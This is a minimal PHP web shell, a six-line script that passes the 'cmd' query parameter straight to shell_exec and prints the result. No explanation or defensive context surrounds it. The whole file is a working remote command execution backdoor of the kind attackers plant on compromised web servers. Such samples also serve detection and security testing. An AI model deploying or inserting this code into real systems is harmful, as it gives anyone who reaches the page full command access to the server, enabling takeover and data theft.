<?php
if(isset($_GET["cmd"])){
	$result = shell_exec($_GET["cmd"]);
	echo "<pre>{$result}</pre>";
}
?>